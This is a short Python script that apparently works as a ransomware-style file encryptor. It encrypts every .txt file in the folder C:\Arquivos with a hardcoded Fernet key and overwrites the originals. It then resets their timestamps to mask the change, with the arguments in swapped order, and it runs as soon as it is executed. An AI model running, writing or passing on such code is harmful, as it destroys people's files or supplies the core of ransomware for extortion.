from cryptography.fernet import Fernet
import os
from pathlib import Path
import datetime

pasta = Path('C:\Arquivos')
ext = ('.txt')

chave = 'jlNNdfsuC0Yq4YrleCHVmD0XWJqMppwYHacYLOuZNvw='

def cripto():
    for arquivo in os.listdir(pasta):
        if arquivo.endswith(ext):
            caminho = pasta / arquivo

            data_m = os.path.getmtime(caminho)
            data_a = os.path.getatime(caminho)

            a = open(caminho, 'rb')
            dados = a.read()
            a.close

            k = Fernet(chave)
            dados_crypto = k.encrypt(dados)

            file = open(caminho, 'wb')
            file.write(dados_crypto)
            file.close()

            os.utime(caminho, (data_m, data_a))

cripto()
